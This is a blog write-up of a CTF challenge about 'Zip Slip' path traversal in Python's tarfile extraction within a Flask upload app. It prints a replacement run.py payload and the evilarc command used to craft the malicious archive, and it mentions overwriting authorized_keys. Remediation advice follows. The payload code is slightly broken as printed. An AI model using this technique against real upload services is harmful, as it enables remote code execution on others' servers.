<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Zip Slip (malicious archives) | haicen.me</title>
<link href="../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
<meta name="theme-color" content="#5670d4">
<meta name="generator" content="Nikola (getnikola.com)">
<link rel="alternate" type="application/rss+xml" title="RSS" hreflang="en" href="../../rss.xml">
<link rel="canonical" href="https://blog.haicen.me/posts/zip-slip-malicious-archives/">
<!--[if lt IE 9]><script src="../../assets/js/html5.js"></script><![endif]--><meta name="author" content="Haicen">
<link rel="prev" href="../reverse-engineering-a-20-remote-controlled-outlet/" title="Reverse Engineering a $20 remote controlled outlet" type="text/html">
<link rel="next" href="../confusing-script-kiddies-with-random-default-server-pages/" title="Confusing script kiddies with random default server pages" type="text/html">
<meta property="og:site_name" content="haicen.me">
<meta property="og:title" content="Zip Slip (malicious archives)">
<meta property="og:url" content="https://blog.haicen.me/posts/zip-slip-malicious-archives/">
<meta property="og:description" content="Recently, I completed a CTF challenge that involved an interesting vulnerability.
Since the challenge is active, I won't be providing screenshots, but I've kept things general enough that it shouldn't">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2021-12-04T17:41:43-05:00">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="evilarc">
<meta property="article:tag" content="flask">
<meta property="article:tag" content="hacking">
<meta property="article:tag" content="python">
<meta property="article:tag" content="zipslip">
</head>
<body>
<a href="#content" class="sr-only sr-only-focusable">Skip to main content</a>

<!-- Menubar -->

<nav class="navbar navbar-inverse navbar-static-top"><div class="container">
<!-- This keeps the margins nice -->
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-navbar" aria-controls="bs-navbar" aria-expanded="false">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="https://blog.haicen.me/">

                <span id="blog-title">haicen.me</span>
            </a>
        </div>
<!-- /.navbar-header -->
        <div class="collapse navbar-collapse" id="bs-navbar" aria-expanded="false">
            <ul class="nav navbar-nav">
<li>
<a href="../../archive.html">Archive</a>
                </li>
<li>
<a href="../../categories/">Tags</a>
                </li>
<li>
<a href="../../rss.xml">RSS feed</a>
                </li>
<li>
<a href="../../pages/about-me">Contact Me</a>

                
            </li>
</ul>
<ul class="nav navbar-nav navbar-right"></ul>
</div>
<!-- /.navbar-collapse -->
    </div>
<!-- /.container -->
</nav><!-- End of Menubar --><div class="container" id="content" role="main">
    <div class="body-content">
        <!--Body content-->
        <div class="row">
            
            
<article class="post-text h-entry hentry postpage" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title" itemprop="headline name"><a href="." class="u-url">Zip Slip (malicious archives)</a></h1>

        <div class="metadata">
            <p class="byline author vcard p-author h-card"><span class="byline-name fn p-name" itemprop="author">
                    Haicen
            </span></p>
            <p class="dateline">
            <a href="." rel="bookmark">
            <time class="published dt-published" datetime="2021-12-04T17:41:43-05:00" itemprop="datePublished" title="2021-12-04 17:41">2021-12-04 17:41</time></a>
            </p>
            

        </div>
        

    </header><div class="e-content entry-content" itemprop="articleBody text">
    <p>Recently, I completed a CTF challenge that involved an interesting vulnerability.
Since the challenge is active, I won't be providing screenshots, but I've kept things general enough that it shouldn't spoil anything.</p>
<section id="the-web-app"><h2>The web app</h2>
<p>The entire app was provided with a dockerfile, so it could be run offline.</p>
<p>My first step was to investigate the app and see what vulnerabilities might exist.
The web app is very simple, and was developed using Flask.
It contains a single web page that allows you to upload a tar.gz file.
The uploaded file is extracted using the <a class="reference external" href="https://docs.python.org/3/library/tarfile.html">tarfile</a> library.
The validation of user uploaded file is insufficient.</p>
<p>First, the file is checked to see if it is indeed a tarfile, with a call to <code class="docutils literal">tarfile.is_tarfile()</code>.
If this is true, then <cite>tarfile.extract_all()</cite> is called. There is a warning about this function in the docs.</p>
<p>Warning</p>
<p><code class="docutils literal">Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots <span class="pre">"..".</span></code></p>
</section><section id="the-vulnerability"><h2>The vulnerability</h2>
<p>Some further research reveals that this is quite an old vulnerability.
The tar program was discovered to be vulnerable all the way back in 2001, <a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2001-1267">CVE-2001-1267</a>
The core issue is that tar did not validate filenames, so if the archive contained a file named <code class="docutils literal"><span class="pre">../../../../etc/passwd</span></code>, when extracted it would overwrite <code class="docutils literal">/etc/passwd</code> by traversing the <code class="docutils literal">../</code> directives as long the user invoking tar had the appropriate permissions)</p>
<p>The python tarfile module apparently shares a great deal of similar code, because the same issue was identified in the python module in 2007 (6 years after the original tar vulnerability).
This was discussed on the python-dev email list <a class="reference external" href="https://mail.python.org/pipermail/python-dev/2007-August/074290.html">https://mail.python.org/pipermail/python-dev/2007-August/074290.html</a>
It was again discussed in 2014, <a class="reference external" href="https://bugs.python.org/issue21109">https://bugs.python.org/issue21109</a>
Now, 20 years later, there still isn't a resolution.</p>
<p>In the general sense, I see two potential ways of exploiting a vulnerability like this.
In modern linux environments, /etc/passwd no longer contains sensitive information like password hashes, so overwriting that file won't allow access to the machine.
One potential attack would be to overwrite the users <code class="docutils literal"><span class="pre">~/.ssh/authorized_keys</span></code> file to include your own key.
Of course, for that to be exploitable, you would already need access to the file system.</p>
<p>Since python is now popular for developing web apps through Django and Flask, this opens up a new avenue: uploading a malicious archive to overwrite or create files.</p>
<p>Back to the challenge, since the app is flask, it is possible to overwrite the main app handler.</p>
<p>The original file is quite simple</p>
<div class="code"><table class="codetable">
<tr>
<td class="linenos linenodiv"><a href="#rest_code_5d05550b16f44aa6ad1684f92562ff5c-1"><code data-line-number="1"></code></a></td>
<td class="code"><code><a id="rest_code_5d05550b16f44aa6ad1684f92562ff5c-1" name="rest_code_5d05550b16f44aa6ad1684f92562ff5c-1"></a><span class="kn">from</span> <span class="nn">application.main</span> <span class="kn">import</span> <span class="n">app</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_5d05550b16f44aa6ad1684f92562ff5c-2"><code data-line-number="2"></code></a></td>
<td class="code"><code><a id="rest_code_5d05550b16f44aa6ad1684f92562ff5c-2" name="rest_code_5d05550b16f44aa6ad1684f92562ff5c-2"></a><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">use_evalex</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</code></td>
</tr>
</table></div>
<p>and the modified code:</p>
<div class="code"><table class="codetable">
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-1"><code data-line-number=" 1"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-1" name="rest_code_830da48576d146a596598d2c7ea8ff80-1"></a><span class="kn">from</span> <span class="nn">application.main</span> <span class="kn">import</span> <span class="n">app</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-2"><code data-line-number=" 2"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-2" name="rest_code_830da48576d146a596598d2c7ea8ff80-2"></a><span class="kn">import</span> <span class="nn">shutil</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-3"><code data-line-number=" 3"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-3" name="rest_code_830da48576d146a596598d2c7ea8ff80-3"></a><span class="kn">import</span> <span class="nn">os</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-4"><code data-line-number=" 4"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-4" name="rest_code_830da48576d146a596598d2c7ea8ff80-4"></a><span class="k">try</span><span class="p">:</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-5"><code data-line-number=" 5"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-5" name="rest_code_830da48576d146a596598d2c7ea8ff80-5"></a>    <span class="n">path</span> <span class="o">=</span> <span class="s1">'/app/application/static/'</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-6"><code data-line-number=" 6"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-6" name="rest_code_830da48576d146a596598d2c7ea8ff80-6"></a>    <span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">'flag'</span><span class="p">))</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-7"><code data-line-number=" 7"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-7" name="rest_code_830da48576d146a596598d2c7ea8ff80-7"></a>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-8"><code data-line-number=" 8"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-8" name="rest_code_830da48576d146a596598d2c7ea8ff80-8"></a>    <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-9"><code data-line-number=" 9"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-9" name="rest_code_830da48576d146a596598d2c7ea8ff80-9"></a>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-10"><code data-line-number="10"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-10" name="rest_code_830da48576d146a596598d2c7ea8ff80-10"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">'logfile.txt'</span><span class="p">),</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-11"><code data-line-number="11"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-11" name="rest_code_830da48576d146a596598d2c7ea8ff80-11"></a>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-12"><code data-line-number="12"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-12" name="rest_code_830da48576d146a596598d2c7ea8ff80-12"></a><span class="k">except</span><span class="p">:</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-13"><code data-line-number="13"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-13" name="rest_code_830da48576d146a596598d2c7ea8ff80-13"></a>    <span class="k">pass</span>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-14"><code data-line-number="14"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-14" name="rest_code_830da48576d146a596598d2c7ea8ff80-14"></a>
</code></td>
</tr>
<tr>
<td class="linenos linenodiv"><a href="#rest_code_830da48576d146a596598d2c7ea8ff80-15"><code data-line-number="15"></code></a></td>
<td class="code"><code><a id="rest_code_830da48576d146a596598d2c7ea8ff80-15" name="rest_code_830da48576d146a596598d2c7ea8ff80-15"></a><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">use_evalex</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</code></td>
</tr>
</table></div>
<p>This simply copies the flag from it's location within the app folder to the static files that are served by flask.
This could be modified to do the same thing for multiple files, or initiate a reverse shell.</p>
</section><section id="the-exploit"><h2>The exploit</h2>
<p>I found a tool that had already been created to craft the malicious archive.</p>
<p><a class="reference external" href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></p>
<p>That script uses the same vulnerable library to craft the archive.
This also appears to work on zip archives as well, but that's something for another time.</p>
<p>Simply running the script <code class="docutils literal">python evilarc.py run.py <span class="pre">-f</span> evil.tar.gz <span class="pre">-o</span> unix <span class="pre">-p</span> /app</code> generates the archive.</p>
<ul class="simple">
<li><p><code class="docutils literal">evil.tar.gz</code> is the file that is created</p></li>
<li><p><code class="docutils literal">run.py</code> is the modified file from earlier</p></li>
<li><p><code class="docutils literal"><span class="pre">-p</span> /app</code> specifies the directory where <code class="docutils literal">run.py</code> will be overwritten after traversal</p></li>
</ul>
<p>Uploading the resulting file in a browser and then doing <code class="docutils literal">curl <span class="pre">http://localhost:1337/static/flag</span></code> outputs the flag.</p>
<p>Further, <code class="docutils literal">curl <span class="pre">http://localhost:1337/static/logfile.txt</span></code> reveals this app is running as root
<code class="docutils literal">'uid=0(root) gid=0(root) <span class="pre">groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span></code></p>
</section><section id="impact"><h2>Impact</h2>
<p>This is a pretty severe vulnerability as it allows full remote code execution.
In this particular instance, the flask app is run as root, and directly runs the app.py file in debug mode.</p>
</section><section id="remediation"><h2>Remediation</h2>
<p>The most severe problem with this app is that the contents of the uploaded file are trusted implicitly.
To fix this, the user-supplied archive should not be blindly extracted.
There currently isn't a fixed version of the <code class="docutils literal">tarfile</code> module, so until that is fixed upstream, some crude checks might provide some protection.
Ex: refusing to extract files that start with <code class="docutils literal">..</code>
The flask app shouldn't be run with debug mode turned on in a production environment.
The flask app also shouldn't be running as root.</p>
<p>I'm not sure how applicable this is to real world websites, as this example relies on <code class="docutils literal">supervisord</code> detecting the overwritten <code class="docutils literal">/app/run.py</code> file and reloading.
Having never deployed a flask app to production myself, my understanding is that something like gnuicorn would only do that if debug settings were explicitly enabled.
<a class="reference external" href="https://docs.gunicorn.org/en/stable/settings.html#debugging">https://docs.gunicorn.org/en/stable/settings.html#debugging</a></p>
</section><section id="closing"><h2>Closing</h2>
<p>This was a really fun challenge (and writing this took much longer than getting the flag).
It is really interesting that this bug still exists 20 years after first identified in tar.
The spread of python based web apps due to the popularity of Django and flask has brought old vulnerabilities that previously required local file system access can now be leveraged to remotely execute code.</p>
</section>
</div>
    <aside class="postpromonav"><nav><ul itemprop="keywords" class="tags">
<li><a class="tag p-category" href="../../categories/ctf/" rel="tag">ctf</a></li>
            <li><a class="tag p-category" href="../../categories/evilarc/" rel="tag">evilarc</a></li>
            <li><a class="tag p-category" href="../../categories/flask/" rel="tag">flask</a></li>
            <li><a class="tag p-category" href="../../categories/hacking/" rel="tag">hacking</a></li>
            <li><a class="tag p-category" href="../../categories/python/" rel="tag">python</a></li>
            <li><a class="tag p-category" href="../../categories/zipslip/" rel="tag">zipslip</a></li>
        </ul>
<ul class="pager hidden-print">
<li class="previous">
                <a href="../reverse-engineering-a-20-remote-controlled-outlet/" rel="prev" title="Reverse Engineering a $20 remote controlled outlet">Previous post</a>
            </li>
            <li class="next">
                <a href="../confusing-script-kiddies-with-random-default-server-pages/" rel="next" title="Confusing script kiddies with random default server pages">Next post</a>
            </li>
        </ul></nav></aside></article>
</div>
        <!--End of body content-->

        <footer id="footer">
            Contents © 2023         <a href="mailto:haicenhack@protonmail.com">Haicen</a> 
            
        </footer>
</div>
</div>


            <script src="../../assets/js/all-nocdn.js"></script><!-- fancy dates --><script>
    moment.locale("en");
    fancydates(0, "YYYY-MM-DD HH:mm");
    </script><!-- end fancy dates --><script>
    baguetteBox.run('div#content', {
        ignoreClass: 'islink',
        captions: function(element) {
            return element.getElementsByTagName('img')[0].alt;
    }});
    </script>
</body>
</html>
